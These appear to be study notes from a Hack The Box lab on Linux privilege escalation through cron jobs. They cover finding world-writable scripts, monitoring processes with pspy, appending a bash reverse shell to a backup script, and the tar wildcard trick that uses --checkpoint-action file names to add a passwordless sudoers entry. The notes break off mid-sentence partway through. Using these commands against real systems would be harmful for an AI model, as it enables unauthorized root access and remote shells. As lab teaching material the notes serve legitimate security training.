look for any files/directories that are world-writeable
```shell-session
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
```

## Check if its writeable
```shell-session
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
```

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

Cron Job Abuse

```shell-session
./pspy64 -pf -i 1000
```


# examp;le with tar
```shell-session
cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

We can see that the script is j
---
# the tar * priv esc technique
An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:


```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

We can check and see that the necessary files were created.

Wildcard Abuse

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

Wildcard Abuse

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```